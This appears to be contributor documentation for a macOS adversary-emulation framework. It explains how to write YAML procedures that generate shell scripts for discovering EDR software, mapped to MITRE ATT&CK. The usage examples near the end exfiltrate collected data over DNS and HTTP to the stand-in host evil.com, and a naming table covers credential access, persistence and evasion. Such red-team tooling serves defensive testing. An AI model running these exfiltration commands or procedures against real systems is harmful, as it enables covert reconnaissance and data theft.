# How to Add a New Procedure in YAML

**Quick Start**: YAML procedures make it easy to create LOTL shell scripts packaged with built-in logging, otput formmating, encoding, encryption, and exfiltration techniques with in just a few minutes.

## Overview

YAML procedures are used to build shell scripts on top of `base.sh` so you can take advantage of additional output encoding, logging, formatting, and exfiltration capabilities over DNS, and HTTP. 


## YAML Structure Order

Fill out your YAML file in this order:

1. **Procedure Metadata** - Basic information about your technique
2. **Arguments** - Command-line options users can specify  
3. **Global Variables** - Data that your functions will reference
4. **Functions** - Shell code that implements the technique

---

## 1. Procedure Metadata

These fields identify your technique and provide basic information.

| Field | Type | Required | Description | Example |
|-------|------|----------|-------------|---------|
| **procedure_name** | string | ✅ | Format: `NNNN_technique_name` (no T prefix) | `1518_security_software` |
| **ttp_id** | string | ✅ | MITRE ATT&CK technique ID (T + 4 digits, optional sub-technique) | `T1518`, `T1518.001` |
| **tactic** | enum | ✅ | MITRE ATT&CK tactic | `Discovery` |
| **guid** | string | ✅ | UUID4 format | `456e7890-e12b-34c5-d678-901234567890` |
| **intent** | string | ✅ | Brief description (10-500 chars) | `Discover security software installed on macOS` |
| **author** | string | ✅ | Author with contact info | `@darmado \| https://x.com/darmad0` |
| **version** | string | ✅ | Semantic version | `2.0.0` |
| **created** | string | ✅ | Date in YYYY-MM-DD format | `2025-05-27` |

<details>
<summary>Procedure Metadata Example</summary>

```yaml
---
procedure_name: 1518_edr_discovery
tactic: Discovery
guid: 456e7890-e12b-34c5-d678-901234567890
intent: Discover EDR software installed on macOS systems
author: "@darmado | https://x.com/darmad0"
version: "1.0.0"
created: "2025-05-28"
```
</details>

---

## 2. Arguments Section

The `arguments` section defines command-line options that users can specify when running your script. Each argument calls one or more functions when used.

| Field | Type | Required | Description | Example |
|-------|------|----------|-------------|---------|
| **option** | string | ✅ | Must use `--long` format only | `--edr-processes` |
| **description** | string | ✅ | Help text (5-100 chars) - use adversary language | `Discover EDR processes using ps` |
| **type** | string | ❌ | Only for value args: `string` or `integer` | `string` |
| **execute_function** | array | ✅ | Functions to call when option used | `[discover_edr_processes]` |

<details>
<summary>Arguments Section Example</summary>

```yaml
procedure:
  arguments:
    - option: "--edr-processes"
      description: "Discover EDR processes using ps"
      execute_function:
        - discover_edr_processes

    - option: "--edr-files"
      description: "Discover EDR files in system paths"
      execute_function:
        - discover_edr_files

    - option: "--edr-all"
      description: "Run all EDR discovery functions"
      execute_function:
        - discover_edr_processes
        - discover_edr_files
```
</details>

---

## 3. Global Variables Section

The `global_variable` section defines data that your functions will reference. Use these global variables to store process names, file paths, and other data that your shell functions need.

| Field | Type | Required | Description | Example |
|-------|------|----------|-------------|---------|
| **name** | string | ✅ | UPPER_CASE format, use naming patterns below | `EDR_PROCESS_NAMES` |
| **type** | string | ✅ | `string` only (we support 2 types) | `string` |
| **default_value** | any | ✅ | Single value or multiple values (see syntax below) | `"falcon cbagent sentinel"` |

### Global Variable Syntax and Usage

| Data Type | YAML Syntax | Used By | What To Store |
|-----------|-------------|---------|---------------|
| **Single Value** | `"single_value"` | `$VAR_NAME` in script functions | Single path, configuration flag, single process name |
| **Multiple Values** | `("item1" "item2" "item3")` | `local items=($VAR_NAME)` in script functions | Process names list, directory paths, file patterns |

### Variable Naming Patterns

| Pattern | Example | Purpose |
|---------|---------|---------|
| `*_PROCESS_NAMES` | `EDR_PROCESS_NAMES` | List of process names for ps commands |
| `*_SEARCH_PATHS` | `SYSTEM_SEARCH_PATHS` | Directory paths for find commands |
| `*_VENDOR_*` | `EDR_VENDOR_PROCESSES` | Structured vendor data with colons |
| `*_SERVICE_PATHS` | `LAUNCH_SERVICE_PATHS` | Service-specific directories |

<details>
<summary>Global Variables Section Example</summary>

```yaml
  global_variable:
    # Multiple process names (multiple values syntax)
    - name: EDR_PROCESS_NAMES
      type: string
      default_value: ("falcon" "cbagent" "sentinel" "cylance")

    # Multiple directory paths (multiple values syntax)
    - name: SYSTEM_SEARCH_PATHS
      type: string
      default_value: ("/Applications" "/Library" "/usr/local")

    # Single process name (single value syntax)
    - name: TARGET_PROCESS_NAME
      type: string
      default_value: "CrowdStrike"
```

**How to use these in your functions:**

```bash
# Multiple values - simple list
discover_edr_processes() {
    local processes=($EDR_PROCESS_NAMES)
    for proc in "${processes[@]}"; do
        # Use $proc in ps commands
    done
}

# Multiple values - directory paths  
discover_edr_files() {
    local search_paths=($SYSTEM_SEARCH_PATHS)
    for path in "${search_paths[@]}"; do
        # Use $path in find commands
    done
}

# Single value - direct usage
check_specific_process() {
    echo "Checking for: $TARGET_PROCESS_NAME"
}
```
</details>

---

## 4. Functions Section

The `functions` section contains the script functions that implement your technique. Each function performs one specific task and outputs results using `printf`. The framework automatically captures this output and routes it through the processing pipeline, enabling users to leverage base.sh capabilities for encoding, encryption, and exfiltration.

| Field | Type | Required | Function Names | Description | Example |
|-------|------|----------|----------------|-------------|---------|
| **name** | string | ✅ | Use MITRE ATT&CK tactic prefixes (see naming table below) | Function name using adversary language | `discover_edr_processes` |
| **opsec** | object | ✅ | N/A | OPSEC requirements | See OPSEC table below |
| **code** | string | ✅ | N/A | Shell function implementation | See code requirements below |

### Code Requirements

Your function code must follow these requirements:

| Requirement | Description | Example |
|-------------|-------------|---------|
| **Output via printf** | Use `printf` to output your results - the framework captures this automatically | `$CMD_PRINTF "EDR_PROCESS\|%s\|%s\n" "$proc" "$result"` |
| **Global commands** | Use predefined global command variables from base.sh (optional but recommended) | `$CMD_PS`, `$CMD_GREP`, `$CMD_FIND` |
| **Global variables** | Use global variables for all data (no hard-coded values) | `local processes=($EDR_PROCESS_NAMES)` |
| **Output format** | Output pipe-delimited format: `TYPE\|PATTERN\|RESULT` | `"EDR_PROCESS\|falcon\|process details"` |
| **Function return** | End functions with `return 0` for proper exit codes | `return 0` |

**Important**: Base.sh provides predefined global variables for all native macOS commands (see [Global Variables Reference](../Index/Global%20Variables.md)). Using these global command variables allows us to update commands across hundreds of scripts simultaneously during the build process or major base.sh updates. **These predefined global variables are reserved and maintained by the framework.**

**Examples of predefined command variables:**
- `$CMD_PS` - Process listing command
- `$CMD_GREP` - Text search command  
- `$CMD_FIND` - File search command
- `$CMD_SQLITE3` - SQLite database command
- `$CMD_OPENSSL` - Encryption/crypto command

<details>
<summary>Code Requirements Example</summary>

```bash
discover_edr_processes() {
    local processes=($EDR_PROCESS_NAMES)
    
    for proc in "${processes[@]}"; do
        local proc_result=$($CMD_PS -axrww | $CMD_GREP -v grep | $CMD_GREP -i "$proc" 2>/dev/null)
        if [ -n "$proc_result" ]; then
            $CMD_PRINTF "EDR_PROCESS|%s|%s\n" "$proc" "$proc_result"
        fi
    done
    return 0
}
```
</details>

### MITRE ATT&CK Function Naming

| Tactic | Function Prefix | Example Function |
|--------|----------------|------------------|
| **Discovery** | `discover_` | `discover_edr_processes` |
| **Credential Access** | `credential_access_` | `credential_access_keychain` |
| **Collection** | `collect_` | `collect_browser_data` |
| **Persistence** | `persist_` | `persist_launch_agent` |
| **Execution** | `execute_` | `execute_payload` |
| **Defense Evasion** | `evade_` | `evade_detection` |

<details>
<summary>MITRE ATT&CK Function Naming Example</summary>

```yaml
# Good function names following MITRE ATT&CK conventions
functions:
  - name: discover_edr_processes      # Discovery tactic
  - name: credential_access_keychain  # Credential Access tactic
  - name: collect_browser_history     # Collection tactic
  - name: persist_launch_daemon       # Persistence tactic
```
</details>

### OPSEC Requirements

The `opsec` section defines security checks that should be performed before your function executes. Use these to prevent script failure or detection when accessing restricted resources.

| Field | Type | Required | Description | Use Case |
|-------|------|----------|-------------|----------|
| **check_fda.enabled** | boolean | ✅ | Check if Full Disk Access is granted before execution | Set to `true` when accessing protected directories like `/Library`, `/private`, user home directories |
| **check_permission** | object | ❌ | Check file/directory permissions before execution | Use when your function needs specific access to files/directories |

### Full Disk Access (FDA) Check

Full Disk Access is required when your script needs to access macOS protected locations. Enable this check to avoid script failure.

**When to use FDA check:**
- Accessing `/Library/Application Support/`
- Reading user home directories outside current user
- Accessing `/private/var/` directories
- Reading system configuration files

**What happens on failure:** Script exits gracefully with error message instead of crashing.

### Permission Checks

Use permission checks when your function needs specific file system access. You can check multiple files and specify different permission requirements.

| Field | Type | Required | Description | Example |
|-------|------|----------|-------------|---------|
| **path** | string | ✅ | File or directory path to check | `/Applications` |
| **required** | string | ✅ | Permission type: `read`, `write`, `execute`, or combinations | `read,write` |
| **exit_on_failure** | boolean | ❌ | Exit script if permission check fails (default: true) | `false` |

**Permission Syntax:**
- Single permission: `"read"`, `"write"`, `"execute"`
- Multiple permissions: `"read,write"`, `"read,execute"`, `"read,write,execute"`

**Multiple Permission Checks:**
You can define multiple permission checks by adding multiple objects to the `check_permission` array.

<details>
<summary>Full Disk Access (FDA) Examples</summary>

```yaml
functions:
  # Function that doesn't need FDA (safe directories only)
  - name: discover_edr_processes
    opsec:
      check_fda:
        enabled: false

  # Function that requires FDA (accessing protected directories)
  - name: credential_access_keychain
    opsec:
      check_fda:
        enabled: true  # Keychain access requires FDA

  # Function that accesses user directories
  - name: collect_user_data
    opsec:
      check_fda:
        enabled: true  # User home directory access requires FDA
```
</details>

<details>
<summary>Permission Checks Examples</summary>

```yaml
functions:
  # Single permission check
  - name: discover_edr_files
    opsec:
      check_fda:
        enabled: false
      check_permission:
        - path: "/Applications"
          required: "read"
          exit_on_failure: true

  # Multiple permission checks with different requirements
  - name: collect_system_info
    opsec:
      check_fda:
        enabled: false
      check_permission:
        - path: "/Applications"
          required: "read"
          exit_on_failure: true
        - path: "/Library/LaunchDaemons"
          required: "read,execute"
          exit_on_failure: false
        - path: "/tmp/output"
          required: "write"
          exit_on_failure: true

  # Permission check that continues on failure
  - name: discover_optional_paths
    opsec:
      check_fda:
        enabled: false
      check_permission:
        - path: "/usr/local/etc"
          required: "read"
          exit_on_failure: false  # Continue even if no access
```
</details>

<details>
<summary>OPSEC Requirements Complete Example</summary>

```yaml
functions:
  - name: discover_edr_processes
    opsec:
      check_fda:
        enabled: false
      check_permission:
        - path: "/Applications"
          required: "read"
          exit_on_failure: true
      code: |
        discover_edr_processes() {
            local processes=($EDR_PROCESS_NAMES)
            
            for proc in "${processes[@]}"; do
                local proc_result=$($CMD_PS -axrww | $CMD_GREP -v grep | $CMD_GREP -i "$proc" 2>/dev/null)
                if [ -n "$proc_result" ]; then
                    $CMD_PRINTF "EDR_PROCESS|%s|%s\n" "$proc" "$proc_result"
                fi
            done
            return 0
        }

    - name: discover_edr_files
      opsec:
        check_fda:
          enabled: false
        check_permission:
          - path: "/Library"
            required: "read,execute"
            exit_on_failure: true
      code: |
        discover_edr_files() {
            local processes=($EDR_PROCESS_NAMES)
            local search_paths=($SYSTEM_SEARCH_PATHS)
            
            for pattern in "${processes[@]}"; do
                for path in "${search_paths[@]}"; do
                    if [ -d "$path" ]; then
                        local file_result=$($CMD_FIND "$path" -iname "*$pattern*" -type f 2>/dev/null | $CMD_HEAD -5)
                        if [ -n "$file_result" ]; then
                            $CMD_PRINTF "EDR_FILE|%s|%s\n" "$pattern" "$file_result"
                        fi
                    fi
                done
            done
            return 0
        }
```
</details>

---

## Complete Example

<details>
<summary>Complete YAML File Example</summary>

```yaml
---
procedure_name: 1518_edr_discovery
ttp_id: T1518
tactic: Discovery
guid: 456e7890-e12b-34c5-d678-901234567890
intent: Discover EDR software installed on macOS systems
author: "@darmado | https://x.com/darmad0"
version: "1.0.0"
created: "2025-05-28"

procedure:
  arguments:
    - option: "--edr-processes"
      description: "Discover EDR processes using ps"
      execute_function:
        - discover_edr_processes

    - option: "--edr-files"
      description: "Discover EDR files in system paths"
      execute_function:
        - discover_edr_files

  global_variable:
    - name: EDR_PROCESS_NAMES
      type: string
      default_value: ("falcon" "cbagent" "sentinel" "cylance")

    - name: SYSTEM_SEARCH_PATHS
      type: string
      default_value: ("/Applications" "/Library" "/usr/local")

  functions:
    - name: discover_edr_processes
      opsec:
        check_fda:
          enabled: false
        check_permission:
          - path: "/Applications"
            required: "read"
            exit_on_failure: true
      code: |
        discover_edr_processes() {
            local processes=($EDR_PROCESS_NAMES)
            
            for proc in "${processes[@]}"; do
                local proc_result=$($CMD_PS -axrww | $CMD_GREP -v grep | $CMD_GREP -i "$proc" 2>/dev/null)
                if [ -n "$proc_result" ]; then
                    $CMD_PRINTF "EDR_PROCESS|%s|%s\n" "$proc" "$proc_result"
                fi
            done
            return 0
        }

    - name: discover_edr_files
      opsec:
        check_fda:
          enabled: false
        check_permission:
          - path: "/Library"
            required: "read,execute"
            exit_on_failure: true
      code: |
        discover_edr_files() {
            local processes=($EDR_PROCESS_NAMES)
            local search_paths=($SYSTEM_SEARCH_PATHS)
            
            for pattern in "${processes[@]}"; do
                for path in "${search_paths[@]}"; do
                    if [ -d "$path" ]; then
                        local file_result=$($CMD_FIND "$path" -iname "*$pattern*" -type f 2>/dev/null | $CMD_HEAD -5)
                        if [ -n "$file_result" ]; then
                            $CMD_PRINTF "EDR_FILE|%s|%s\n" "$pattern" "$file_result"
                        fi
                    fi
                done
            done
            return 0
        }
```
</details>

## Build and Test Process

### GitHub Actions (Recommended)

GitHub Actions automates the entire validation and build process. Simply create a Pull Request to trigger automated testing:

1. **Fork Repository**: Fork attack-macOS on GitHub (click Fork button)
2. **Clone Your Fork**: `git clone https://github.com/YOUR_USERNAME/attack-macOS.git`
3. **Create YAML**: Add your YAML file to the appropriate directory
4. **Create Pull Request**: Push changes and create PR - GitHub Actions handles the rest

**Complete Git Workflow:**
```bash
# Clone your forked repository
git clone https://github.com/YOUR_USERNAME/attack-macOS.git
cd attack-macOS

# Create feature branch
git checkout -b feature/1518-edr-discovery

# Add your YAML file
git add attackmacos/ttp/discovery/security_software/1518_edr_discovery.yml
git commit -m "Add EDR discovery technique T1518"
git push origin feature/1518-edr-discovery

# Create pull request (triggers GitHub Actions automatically)
gh pr create --title "Add EDR Discovery Technique" --body "Implements T1518 for EDR discovery"
```

### Local Development (Alternative)

For local testing and development:

1. **Create YAML**: Follow the structure above
2. **Validate**: `python3 build_procedure.py --validate your_procedure.yml`
3. **Build**: `python3 build_procedure.py your_procedure.yml`
4. **Test**: Run the generated script with various options
5. **Verify JSON**: Test with `--format json` to ensure proper integration

## Built-in Output Handling

Your completed script includes built-in functions for advanced output handling. The framework automatically captures your function output and routes it through these capabilities:

- **Output formatting**: `--format json`, `--format csv` for structured data
- **Encoding**: `--encode base64`, `--encode hex` for data obfuscation
- **Encryption**: `--encrypt aes`, `--encrypt gpg` for data protection  
- **Exfiltration**: `--exfil-dns domain.com`, `--exfil-http url` for data extraction
- **Logging**: `--log` for automatic file logging with rotation

Simply use `printf` in your functions to output data - the framework handles the rest, enabling sophisticated adversary techniques without additional coding.

<details>
<summary>Script Usage Examples</summary>

**Basic Discovery:**
```bash
# Run basic EDR process discovery
./1518_edr_discovery.sh --edr-processes

# Output JSON format
./1518_edr_discovery.sh --edr-processes --format json

# Run all discovery functions
./1518_edr_discovery.sh --edr-processes --edr-files
```

**Advanced Output Handling:**
```bash
# Encode output with base64
./1518_edr_discovery.sh --edr-processes --encode base64

# Encrypt output with AES
./1518_edr_discovery.sh --edr-processes --encrypt aes

# Exfiltrate via DNS
./1518_edr_discovery.sh --edr-processes --exfil-dns evil.com

# Exfiltrate via HTTP with JSON formatting
./1518_edr_discovery.sh --edr-processes --format json --exfil-http http://evil.com/collect

# Combine encoding, encryption, and exfiltration
./1518_edr_discovery.sh --edr-processes --encode base64 --encrypt aes --exfil-dns evil.com
```

**Logging and Verbose Output:**
```bash
# Enable logging to file
./1518_edr_discovery.sh --edr-processes --log

# Verbose output for debugging
./1518_edr_discovery.sh --edr-processes --verbose

# Debug mode with detailed execution info
./1518_edr_discovery.sh --edr-processes --debug
```
</details>
